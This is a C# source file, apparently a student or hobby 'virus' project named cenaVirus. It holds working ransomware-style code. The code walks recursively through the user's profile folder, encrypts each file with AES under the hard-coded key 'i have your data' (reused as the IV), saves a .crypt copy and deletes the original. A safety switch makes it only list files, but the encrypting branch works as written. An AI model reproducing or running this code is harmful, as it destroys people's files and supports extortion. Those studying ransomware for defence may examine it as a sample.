using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace cenaVirus
{
    class encrypt
    {

         Boolean safetySwitch = true;

        public encrypt(Boolean temp)
        {
            safetySwitch = temp;
        }


        //Start scanning the user directory
        public void processUser()
        {
            string userDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            //string userDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            ProcessDirectory(userDir);
        }

        private  void ProcessDirectory(string targetDirectory)
        {

                string[] fileEntries = Directory.GetFiles(targetDirectory);
                foreach (string fileName in fileEntries)
                procFile(fileName);


                // Recurse into subdirectories of this directory.
                string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
                foreach (string subdirectory in subdirectoryEntries)
                {
                    try
                    {
                        ProcessDirectory(subdirectory);
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Huh. Error in Proc Dir");
                        continue;
                    }
            }

        }

        private  void procFile(string path)
        {
            //IF saftey is set to true the we will only list your files
            if (safetySwitch)
            {
                Console.WriteLine("Processed file '{0}'.", path);
            }
            else
            {
                try
                {
                    Console.WriteLine("Encrypting:\t" + path);
                    encryptFile(path, (Path.Combine(Path.GetDirectoryName(path), Path.GetFileNameWithoutExtension(path)) + ".crypt"), "i have your data");
                    File.Delete(path);
                }
                catch(Exception)
                {

                }
            }
        }

        private  void encryptFile(string inputFile, string outputFile, string skey)
        {
            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);

                    /* This is for demostrating purposes only. 
                     * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                    byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);

                    using (FileStream fsCrypt = new FileStream(outputFile, FileMode.Create))
                    {
                        using (ICryptoTransform encryptor = aes.CreateEncryptor(key, IV))
                        {
                            using (CryptoStream cs = new CryptoStream(fsCrypt, encryptor, CryptoStreamMode.Write))
                            {
                                using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                                {
                                    int data;
                                    while ((data = fsIn.ReadByte()) != -1)
                                    {
                                        cs.WriteByte((byte)data);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // failed to encrypt file
            }
        }
    }
}
